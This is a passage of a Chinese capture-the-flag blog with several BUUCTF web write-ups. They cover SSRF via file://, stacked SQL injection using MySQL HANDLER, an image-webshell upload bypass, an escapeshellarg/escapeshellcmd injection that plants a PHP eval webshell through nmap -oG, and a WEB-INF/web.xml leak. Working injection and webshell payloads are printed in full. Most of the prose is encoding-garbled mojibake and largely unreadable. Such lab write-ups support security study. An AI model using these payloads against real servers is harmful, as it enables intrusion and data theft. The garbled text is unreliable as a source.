    cURLæ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œ1997å¹´é¦–æ¬¡å‘è¡Œã€‚å®ƒæ”¯æŒæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ‰€ä»¥æ˜¯ç»¼åˆä¼ è¾“å·¥å…·ï¼Œä½†æŒ‰ä¼ ç»Ÿï¼Œä¹ æƒ¯ç§°cURLä¸ºä¸‹è½½å·¥å…·ã€‚
    cURLè¿˜åŒ…å«äº†ç”¨äºç¨‹åºå¼€å‘çš„libcurlã€‚
PHPæ”¯æŒçš„ç”±Daniel Stenbergåˆ›å»ºçš„libcurlåº“å…è®¸ä½ ä¸å„ç§çš„æœåŠ¡å™¨ä½¿ç”¨å„ç§ç±»å‹çš„åè®®è¿›è¡Œè¿æ¥å’Œé€šè®¯ã€‚
	libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚
	PHPä¸­ä½¿ç”¨cURLå®ç°Getå’ŒPostè¯·æ±‚çš„æ–¹æ³•
	è¿™äº›å‡½æ•°åœ¨PHP 4.0.2ä¸­è¢«å¼•å…¥ã€‚
 </code></pre>

<p>æ–°çŸ¥è¯†ï¼šè¿™é‡Œåˆ©ç”¨äº†ssrfæ¼æ´</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/company-information/220086.html">SSRFæ¼æ´æ”»å‡»åŸç†åŠé˜²å¾¡æ–¹æ¡ˆ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fageweiketang/article/details/88983921"> SSRF æ¼æ´è®°å½•_å‘å“¥å¾®è¯¾å ‚-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">SSRFæ¼æ´(åŸç†&amp;ç»•è¿‡å§¿åŠ¿) - T00ls.Net</a></p>
<p>SSRFï¼ˆServer-Side Request Forgeryï¼‰ä¹Ÿå±äºåº”ç”¨å±‚ä¸Šçš„ä¸€ä¸ªæ¼æ´ç±»å‹ï¼Œç”¨ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­æ¥ç†è§£è¿™ä¸ªæ¼æ´ï¼šæ¯”å¦‚ä¸€ä¸ªæ·»åŠ å›¾æ–‡çš„åŠŸèƒ½ï¼Œå¡«å…¥æ ‡é¢˜å†…å®¹å’Œå°é¢å›¾ç„¶åæäº¤åœ¨ç½‘ç«™å‰å°æ˜¾ç¤ºï¼Œå¯¹äºè¿™ä¸ªåŠŸèƒ½çš„å›¾ç‰‡å®ƒé™¤äº†å¯ä»¥è®©ä½ ä¸Šä¼ ä»¥å¤–ï¼Œè¿˜æ”¯æŒå¡«å…¥è¿œç¨‹å›¾ç‰‡åœ°å€ï¼Œå¦‚æœä½ å¡«å…¥äº†è¿œç¨‹çš„å›¾ç‰‡åœ°å€ï¼Œåˆ™è¯¥ç½‘ç«™ä¼šåŠ è½½è¿œç¨‹å›¾è¿‡æ¥è¿›è¡Œæ˜¾ç¤ºï¼Œè€Œå¦‚æœç¨‹åºå†™æ³•ä¸ä¸¥è°¨æˆ–è€…è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œåˆ™åŠ è½½å›¾ç‰‡åœ°å€çš„è¿™ä¸ªåŠŸèƒ½å¯èƒ½å°±å¯ä»¥åŒ…å«è¿›è¡Œä¸€äº›æ¶æ„çš„è„šæœ¬æ–‡ä»¶ï¼Œæˆ–è€…ä½ è¾“å…¥å†…ç½‘çš„ ip æˆ–è€…ä¸€äº›ç³»ç»Ÿçš„æ–‡ä»¶éƒ½ä¼šè¢«è§£ææ‰§è¡Œï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸€èˆ¬å«å®ƒ SSRF å³æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ã€‚</p>
<p>curl ä½¿ç”¨çš„ç»å…¸è¿‡ç¨‹ï¼Œåˆå§‹åŒ–ï¼Œç„¶åè®¾ç½®è®¿é—®çš„åœ°å€ï¼Œéšåæ‰§è¡Œï¼Œæœ€åå…³é—­ã€‚</p>
<p>å°†URLæ¢æˆfile://çš„å½¢å¼ï¼Œå°±å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬è¦è®¿é—®çš„æ˜¯flag.phpï¼Œæ‰€ä»¥æŒ‰ç…§ä¹‹å‰sqlæ³¨å…¥å¾—å‡ºæ¥çš„åºåˆ—åŒ–å†…å®¹è¿›è¡Œä¿®æ”¹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225352853.png" alt="image-20210724225352853"></p>
<p>æœ€ç»ˆpayloadä¸º</p>
<pre class="language-none"><code class="language-none">?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</code></pre>

<p>çœ‹ä¸€ä¸‹æºç ï¼Œæ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225327036.png" alt="image-20210724225327036"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225342961.png" alt="image-20210724225342961"></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>è¿™ä¸ªçœ‹èµ·æ¥å’Œå¼ºç½‘æ¯é‚£ä¸ªæœ‰ç‚¹åƒ</p>
<p>åŒæ ·ä¹Ÿæ˜¯å †å æ³¨å…¥</p>
<p>å¯ä»¥ç”¨</p>
<p>1&#39;;show tables;#æŸ¥è¡¨</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725230626425.png" alt="image-20210725230626425"></p>
<p>flagåº”è¯¥å°±åœ¨flaghereè¿™ä¸ªè¡¨é‡Œ</p>
<p>çœ‹ä¸€ä¸‹åˆ—å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231110024.png" alt="image-20210725231110024"></p>
<p>æƒ³æŸ¥çœ‹çš„æ—¶å€™å‘ç°å­˜åœ¨è¿‡æ»¤</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231208544.png" alt="image-20210725231208544"></p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨headler</p>
<p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p>
<p>æœ€ç»ˆpayloadï¼š1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>ï¼ˆè¯•äº†ä¸€ä¸‹åˆ©ç”¨headlerå¼ºç½‘æ¯çš„æ‹¿åˆ°ä¹Ÿèƒ½æ³¨å‡ºæ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231720309.png" alt="image-20210725231720309"></p>
<p><strong>å…³äºhandlerå‘½ä»¤</strong><br>è½¬è½½è‡ª:<a target="_blank" rel="noopener" href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p>
<p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚<br>HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚</p>
<p>åŸºæœ¬è¯­æ³•ï¼š</p>
<pre class="language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ &#123; FIRST | NEXT &#125;
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE</code></pre>

<p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p>
<p>é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</p>
<p>é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚</p>
<p>å¦‚æœæˆ‘ä»¬ä¸æƒ³æµè§ˆä¸€ä¸ªè¡¨çš„æ‰€æœ‰è¡Œï¼Œå¯ä»¥ä½¿ç”¨whereå’Œlimitå­å¥ã€‚</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>è¿™ä¸ªå’Œä¹‹å‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜å·®ä¸å¤šï¼Œä¸Šä¼ æ—¶è¿‡æ»¤äº†phåç¼€åï¼Œæ‰€ä»¥è¦ä¸Šä¼ ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒæ—¶è¿˜è¦ä¸Šä¼ ä¸ª.htaccessæ–‡ä»¶è§£æå›¾ç‰‡é©¬ï¼Œç”¨bpæŠ“åŒ…æŠŠç±»å‹æ”¹æˆimage/jpegå°±è¡Œ</p>
<p>ç„¶åèœåˆ€ç»ƒä¸€ä¸‹åœ¨æ ¹ç›®å½•é‡Œå°±èƒ½æ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210803230538636.png" alt="image-20210803230538636"></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>å…ˆç›´æ¥è´´å‚è€ƒçš„æ–‡ç« äº†</p>
<p>[BUUCTF__<a target="_blank" rel="noopener" href="https://blog.csdn.net/tm_1024/article/details/107393796?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BUUCTF 2018]Online Tool_é¢˜è§£_é£è¿‡æ±Ÿå—ä¹±çš„åšå®¢-CSDNåšå®¢</a></p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102835099?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">BUUCTF 2018]Online Tool_æ²ç›®çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ (lmxspace.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡ (seebug.org)</a></p>
<p>[2020/7/08 - <a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167/">BUUCTF 2018]Online Tool - nmap\escapeshellargä¸escapeshellcmdè¿ç”¨_M4xlmumçš„åšå®¢-CSDNåšå®¢</a></p>
<p>å…ˆæ˜¯ä»£ç å®¡è®¡ï¼Œåˆæ˜¯æ²¡è§è¿‡çš„ä¸œè¥¿</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804001517374.png" alt="image-20210804001517374"></p>
<p>ç¬¬ä¸€ä¸ªifè¯­å¥å¥½åƒæ²¡å•¥ç”¨</p>
<p>åœ¨PHP ä¸­ä½¿ç”¨ <em><strong>*$_SERVER[&quot;REMOTE_ADDR&quot;]*</strong></em> æ¥å–å¾—å®¢æˆ·ç«¯çš„ IPåœ°å€ï¼Œä½†å¦‚æœå®¢æˆ·ç«¯æ˜¯ä½¿ç”¨ä»£ç†æœåŠ¡å™¨æ¥è®¿é—®ï¼Œé‚£å–åˆ°çš„å°±</p>
<p>æ˜¯ä»£ç†æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„å®¢æˆ·ç«¯ IP åœ°å€ã€‚è¦æƒ³é€è¿‡ä»£ç†æœåŠ¡å™¨å–å¾—å®¢æˆ·ç«¯çš„çœŸå® IP åœ°å€ï¼Œå°±è¦ä½¿ç”¨</p>
<p><em><strong>*$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]*</strong></em> æ¥è¯»å–ã€‚</p>
<p>ä¸è¿‡è¦æ³¨æ„çš„äº‹ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªä»£ç†æœåŠ¡å™¨éƒ½èƒ½ç”¨ $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] æ¥è¯»å–å®¢æˆ·ç«¯çš„çœŸå®IPï¼Œæœ‰äº›ç”¨æ­¤</p>
<p>æ–¹æ³•è¯»å–åˆ°çš„ä»ç„¶æ˜¯ä»£ç†æœåŠ¡å™¨çš„ IPã€‚</p>
<p>ç¬¬äºŒä¸ªifè¯­å¥æ˜¯è¦æ±‚ä¼ å…¥ä¸€ä¸ªå‚æ•°ç„¶ååˆ©ç”¨escapeshellargå’Œescapeshellcmdä¸¤ä¸ªå‡½æ•°çš„æ¼æ´å®ç°systemå‘½ä»¤æ‰§è¡Œ</p>
<pre class="language-none"><code class="language-none">&#96;escapeshellarg&#96;ï¼Œä¼šåœ¨å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„å•å¼•å·ï¼ˆåŒ…æ‹¬æˆå¯¹å­˜åœ¨é—­åˆçš„ï¼‰å‰æ·»åŠ ä¸€ä¸ª&#96;&#39;\&#39;&#96; ï¼Œè‹¥å·²ç»ç”¨&#96;\&#96;è½¬ä¹‰ï¼Œåˆ™ä¼šç”¨å¹¶ä¸”ç”¨&#96;&#39;\&#39;&#96; æ›¿æ¢&#96;\&#96;ï¼Œæœ€åå°†æ•´ä¸ªå˜é‡ç”¨å•å¼•å·åŒ…è£¹ã€‚
escapeshellcmd&#96;ï¼Œä¼šå°†å­—ç¬¦ä¸²ä¸­æœªè¢«è½¬ä¹‰çš„åŒå¼•å·æˆ–å•å¼•å·è½¬ä¹‰ï¼ˆæˆå¯¹å­˜åœ¨é—­åˆçš„åŒå¼•å·æˆ–å•å¼•å·é™¤å¤–ï¼‰è‹¥å·²è¢«è½¬ä¹‰ï¼Œåˆ™ç”¨&#96;\\\&quot;&#96;æˆ–&#96;\\\&#39;&#96;æ›¿&#96;\&quot;&#96;æˆ–&#96;\&#39;</code></pre>

<p>è¿™ä¸ªæ¼æ´ç±»ä¼¼è¿™ç§</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804005109985.png" alt="image-20210804005109985"></p>
<p>mkdirå‘½ä»¤æ˜¯Linuxä¸­çš„æ–°å»ºæ–‡ä»¶å¤¹</p>
<p>chdiræ”¹å˜ç›®å½•</p>
<p>æœ€åå°±æ˜¯systemçš„å‘½ä»¤æ‰§è¡Œäº†ï¼Œè¿™é‡Œé¢æ˜¯nmapçš„ä¸€äº›å‘½ä»¤</p>
<p>-T5 :æ‰«æç­‰çº§,è¶Šå¤§è¶Šå¿«,è¶Šå¿«è¶Šä¸å®‰å…¨,æœ€å¥½è®¾ç½®ä¸º-T4</p>
<p>-sT :TCP connent æ‰«æ,ä¸å¤ªå®‰å…¨(ç•™ä¸‹è®°å½•ä¿¡æ¯),è€Œä¸”é€Ÿåº¦è¾ƒæ…¢,ä¸€èˆ¬å…ˆä½¿ç”¨-sSæµ‹è¯•</p>
<p>-Pn :ç¦ç”¨ping</p>
<p>-host-timeout 2:è®¾ç½®æ‰«æä¸€å°ä¸»æœºçš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚</p>
<p>-F :å¿«é€Ÿæ‰«ææ¨¡å¼ï¼Œåªæ‰«æåœ¨nmap-servicesæ–‡ä»¶ä¸­åˆ—å‡ºçš„ç«¯å£ã€‚</p>
<p>-oG test.txt: å°†æ‰«æç»“æœç”Ÿæˆ test.txt æ–‡ä»¶</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•åˆ©æ¼æ´ç»™é‡Œé¢ä¼ å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p>
<p>payload</p>
<pre class="language-none"><code class="language-none">&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre>

<p>ç„¶åç»è¿‡escapeshellargå’Œescapeshellcmdä¸¤ä¸ªå‡½æ•°å°±ä¼šå˜æˆç±»ä¼¼è¿™ç§</p>
<pre class="language-none"><code class="language-none">&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></pre>

<p>è¿™é‡Œå•å¼•å·éƒ½é—­åˆäº†ä¸ä¼šå½±å“åˆ°ä¼ å…¥çš„ä¸€å¥è¯æœ¨é©¬</p>
<p>ä¹‹åå°±å¯ä»¥ç”¨èœåˆ€è¿æ¥æ‰¾flagäº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004604659.png" alt="image-20210804004604659"></p>
<p> e9612257fa1c5134d014e95a7440d357</p>
<p>è¿™æ˜¯ä¸Šä¼ åçš„åœ°å€</p>
<p>èœåˆ€è¿ä¸€ä¸‹<a target="_blank" rel="noopener" href="http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/">http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/</a> e9612257fa1c5134d014e95a7440d357/1.php</p>
<p>æ ¹ç›®å½•æ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004814988.png" alt="image-20210804004814988"></p>
<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>é¦–å…ˆæ˜¯ä¸ªç™»å½•æ¡†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124202495.png" alt="image-20210808124202495"></p>
<p>çœ‹ä¸€ä¸‹helpçš„å†…å®¹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124233134.png" alt="image-20210808124233134"></p>
<p>è¯•è¯•æŠ“åŒ…ç„¶åæ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼åä¼šä¸‹è½½ä¸€ä¸ªwordæ–‡æ¡£ï¼Œæ²¡å•¥ç”¨</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124659707.png" alt="image-20210808124659707"></p>
<p>è¿™é‡Œæœ‰ä¸ªæ¼æ´WEB-INF/web.xmlæ³„éœ²</p>
<pre class="language-none"><code class="language-none">WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:
&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚
&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­
&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶
&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚
&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶
æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </code></pre>

<p>æ¼æ´æˆå› </p>
<pre class="language-none"><code class="language-none">é€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB-INFç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB-INFç›®å½•å°±å¥½äº†ï¼š location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; æˆ–è€…return 404; æˆ–è€…å…¶ä»–ï¼</code></pre>

<p>æ¼æ´åˆ©ç”¨</p>
<pre class="language-none"><code class="language-none">æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </code></pre>

<p>æ‰€ä»¥å…ˆè®¿é—®ä¸€ä¸‹WEB-INF/web.xml</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808125056946.png" alt="image-20210808125056946"></p>
<p>è¿™ä¸ªè·¯å¾„com.wm.ctf.IndexControlleråº”è¯¥å’Œflagæœ‰å…³</p>
<p>æ‰€ä»¥è¯•è¯•è®¿é—®ä¸€ä¸‹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131605144.png" alt="image-20210808131605144"></p>
<p>çœ‹åˆ°æœ‰å—ç±»ä¼¼base64</p>
<p>è§£ç å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131703878.png" alt="image-20210808131703878"></p>
